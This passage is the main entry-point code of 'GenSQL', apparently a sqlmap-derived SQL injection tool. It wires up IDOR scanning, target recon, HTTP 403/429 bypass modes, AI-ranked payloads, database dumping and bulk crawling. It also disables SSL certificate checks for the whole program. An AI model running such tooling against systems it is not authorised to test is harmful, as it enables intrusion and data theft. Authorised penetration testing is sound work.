            s, e = map(int, getattr(o, "idor_range", "1-1000").split("-"))
        except Exception:
            s, e = 1, 1000
        conf.idorScanner = RESTInj(idor_start=s, idor_end=e)
        logger.info("IDOR scanner active (range %d-%d)" % (s, e))


# ── Recon ─────────────────────────────────────────────────────────────────────
def _recon(o):
    if not (getattr(o, "deep_recon", False) and hasattr(conf, "deepRecon")):
        return
    url = getattr(conf, "url", None)
    if not url: return
    m = re.search(r"https?://([^/]+)", url)
    if not m: return
    try:
        findings = conf.deepRecon.generate_recon_report(m.group(1))
        for key, label in [("technologies","Tech"),("cloud_provider","Cloud"),
                            ("subdomains","Subdomains"),("api_endpoints","API endpoints")]:
            v = findings.get(key)
            if v: logger.info("%s: %s" % (label, ", ".join(v) if isinstance(v,list) else str(v)))
        kb.genReconFindings = findings
    except Exception as ex:
        logger.warning("Recon error: %s" % getSafeExString(ex))


# ── Standalone bypass mode ────────────────────────────────────────────────────
def _maybe_run_bypass_standalone(o):
    """If --bypass-url is given without a -u scan, run bypass and exit."""
    if getattr(o, "bypass_url", None):
        _run_bypass(o)
        return True
    # Also run if any bypass flag set with no scan target
    bypass_flags = ("bypass_403","bypass_404","bypass_429","bypass_503","auto_bypass")
    if any(getattr(o, f, False) for f in bypass_flags):
        if not any(f in sys.argv for f in ("-u","--url","-r","--data","-m","-l")):
            logger.warning("Specify a target with -u URL or --bypass-url URL")
    return False


# ── Finalise ──────────────────────────────────────────────────────────────────
def _finalize(o):
    # Run advanced dump after scan if requested
    if getattr(o, "adv_dump", False):
        try: _run_adv_dump(o)
        except Exception as ex: logger.warning("Dump error: %s" % getSafeExString(ex))

    if hasattr(conf, "reportEngine"):
        try: conf.reportEngine.finalize(); logger.info("Reports written")
        except Exception as ex: logger.warning("Report error: %s" % getSafeExString(ex))

    top_n = getattr(o, "ai_top_payloads", 0)
    if top_n > 0 and hasattr(conf, "aiEngine"):
        try:
            top = conf.aiEngine.get_best_payloads(count=top_n)
            if top:
                dataToStdout("\n\033[01;36m[*] Top AI payloads:\033[0m\n", forceOutput=True)
                for i, (pl, sc) in enumerate(top, 1):
                    dataToStdout("  %2d. [%.3f] %s\n" % (i, sc, pl), forceOutput=True)
        except Exception: pass

    if hasattr(conf, "dashboard"):
        try: conf.dashboard.stop()
        except Exception: pass


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    """GenSQL v2.0.0 — by Jeevraj"""

    # 1. Wizard
    if "--wizard" in sys.argv:
        try:
            extra = _wizard()
            if extra:
                sys.argv = [sys.argv[0]] + extra + [
                    a for a in sys.argv[1:] if a != "--wizard"]
            else:
                sys.exit(0)
        except (KeyboardInterrupt, EOFError):
            print(); sys.exit(0)

    # 2. Parse GenSQL flags
    o, _parser = _args()

    # 3. Apply profile
    if getattr(o, "profile", None):
        _profile(o.profile, o)

    # 4. Standalone bypass mode (no scan needed)
    if _maybe_run_bypass_standalone(o):
        return

    # 5. Strip GenSQL flags from sys.argv before core parser
    sys.argv = _strip_gensql_args(sys.argv)

    try:
        dirtyPatches(); resolveCrossReferences(); checkEnvironment(); setPaths(modulePath())
        printBanner()

        args = cmdLineParser()
        cmdLineOptions.update(args.__dict__ if hasattr(args, "__dict__") else args)
        initOptions(cmdLineOptions)

        if checkPipedInput(): conf.batch = True

        if conf.get("api"):
            from lib.utils.api import StdDbOut, setRestAPILog
            sys.stdout = StdDbOut(conf.taskid, messagetype="stdout")
            sys.stderr = StdDbOut(conf.taskid, messagetype="stderr")
            setRestAPILog()

        conf.showTime = True
        dataToStdout("[!] legal disclaimer: %s\n\n" % LEGAL_DISCLAIMER, forceOutput=True)
        dataToStdout("[*] starting @ %s\n\n" % time.strftime("%X /%Y-%m-%d/"), forceOutput=True)

        init()

        # Disable SSL cert verification globally (GenSQL handles this)
        try:
            import ssl as _ssl
            _ssl._create_default_https_context = _ssl._create_unverified_context
        except Exception:
            pass

        # Auto-accept server-set cookies when --batch is active
        try:
            if conf.get("batch") or "--batch" in sys.argv:
                conf.getCookies = True
        except Exception:
            pass

        _init(o)
        _recon(o)

        if not conf.updateAll:
            if conf.smokeTest:
                from lib.core.testing import smokeTest; os._exitcode = 1 - (smokeTest() or 0)
            elif conf.vulnTest:
                from lib.core.testing import vulnTest; os._exitcode = 1 - (vulnTest() or 0)
            elif conf.fpTest:
                from lib.core.testing import fpTest; os._exitcode = 1 - (fpTest() or 0)
            elif conf.payloadLint:
                from lib.core.testing import payloadLintTest; os._exitcode = 1 - (payloadLintTest() or 0)
            elif conf.apiTest:
                from lib.core.testing import apiTest; os._exitcode = 1 - (apiTest() or 0)
            else:
                from lib.controller.controller import start
                if conf.profile:
                    from lib.core.profiling import profile; profile()
                else:
                    try:
                        if conf.crawlDepth and conf.bulkFile:
                            for i, tgt in enumerate(getFileItems(conf.bulkFile)):
                                try:
                                    kb.targets = OrderedSet()
                                    if not re.search(r"(?i)\Ahttp[s]*://", tgt):
                                        tgt = "https://" + tgt
                                    logger.info("crawling %r (%d)" % (tgt, i + 1))
                                    crawl(tgt)
                                except Exception as ex:
                                    if not isinstance(ex, SqlmapUserQuitException):
                                        logger.error("crawl error: %s" % getSafeExString(ex))
                                    else: raise
                                else:
                                    if kb.targets: start()
                        else:
                            start()
                    except Exception as ex:
                        os._exitcode = 1
                        if "can't start new thread" in getSafeExString(ex):
                            logger.critical("unable to start new threads"); raise SystemExit
                        else: raise

    except SqlmapUserQuitException:
        if not conf.batch: logger.error("user quit")
    except (SqlmapSilentQuitException, bdb.BdbQuit): pass
    except SqlmapShellQuitException: cmdLineOptions.sqlmapShell = False
    except SqlmapBaseException as ex:
        logger.critical(getSafeExString(ex)); os._exitcode = 1; raise SystemExit
    except KeyboardInterrupt:
        try: print()
        except IOError: pass
    except EOFError: print(); logger.error("exit")
    except SystemExit as ex: os._exitcode = ex.code or 0
    except Exception:
        print()
        errMsg = unhandledExceptionMessage()
        excMsg = traceback.format_exc()
        os._exitcode = 255
        errMsg = maskSensitiveData(errMsg); excMsg = maskSensitiveData(excMsg)
        logger.critical(errMsg)
        dataToStdout("%s\n" % setColor(excMsg.strip(), level=logging.CRITICAL))
        if not codeIsModified(): createGithubIssue(errMsg, excMsg)
    finally:
        kb.threadContinue = False
        try: _finalize(o)
        except Exception: pass
        if (getDaysFromLastUpdate() or 0) > LAST_UPDATE_NAGGING_DAYS:
            logger.warning("GenSQL is outdated — pull the latest version")
        if conf.get("reportCollector") is not None:
            try:
                from lib.utils.api import writeReportJson
                writeReportJson(conf.reportCollector, conf.reportJson)
            except Exception: pass
            finally:
                try: conf.reportCollector.disconnect()
                except Exception: pass
        if conf.get("showTime"):
            dataToStdout("\n[*] ending @ %s\n\n" % time.strftime("%X /%Y-%m-%d/"), forceOutput=True)
        kb.threadException = True
        for tmpDir in conf.get("tempDirs", []):
            for pfx in (MKSTEMP_PREFIX.IPC, MKSTEMP_PREFIX.TESTING,
                        MKSTEMP_PREFIX.COOKIE_JAR, MKSTEMP_PREFIX.BIG_ARRAY):
                for fp in glob.glob(os.path.join(tmpDir, "%s*" % pfx)):
                    try: os.remove(fp)
                    except OSError: pass
        if conf.get("hashDB"): conf.hashDB.flush(); conf.hashDB.close()
        if conf.get("harFile"):
            try:
                with openFile(conf.harFile, "w+") as f:
                    json.dump(conf.httpCollector.obtain(), fp=f, indent=4, separators=(",", ": "))
            except SqlmapBaseException: pass
        if conf.get("api"): conf.databaseCursor.disconnect()
        if conf.get("dumper"): conf.dumper.flush()
        _ = time.time()
        while threading.active_count() > 1 and (time.time() - _) < THREAD_FINALIZATION_TIMEOUT:
            time.sleep(0.01)
        if cmdLineOptions.get("sqlmapShell"):
            cmdLineOptions.clear(); conf.clear(); kb.clear()
            conf.disableBanner = True; main()


if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: pass
    except SystemExit: raise
    except Exception: traceback.print_exc()
    finally:
        if threading.active_count() > 1: os._exit(getattr(os, "_exitcode", 0))
        else: sys.exit(getattr(os, "_exitcode", 0))
else:
    __import__("lib.controller.controller")
    from lib.utils.library import scan, scanFromRequest, SqlmapError

__all__ = ["scan", "scanFromRequest", "SqlmapError"]
